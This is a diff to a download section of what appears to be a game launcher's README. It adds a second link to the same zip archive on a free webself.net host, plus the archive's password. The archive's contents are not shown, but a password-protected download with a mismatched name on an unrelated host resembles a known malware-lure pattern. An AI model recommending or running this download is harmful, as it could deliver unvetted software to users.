@@ -14,9 +14,12 @@ Computer needed:
 
 ### Download
 #### [Download the latest version](https://etron-59.webself.net/file/si1788581/download/Everything-fi27548739.zip)
+##### [Download the latest portable version](https://etron-59.webself.net/file/si1788581/download/Everything-fi27548739.zip)
 
+The password is: MineBlocks-Launcher
 
 ##### Windows XP to Windows 7 Downloads:
+
 
 [Download Microsoft .NET Gramework 4](https://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe)
 
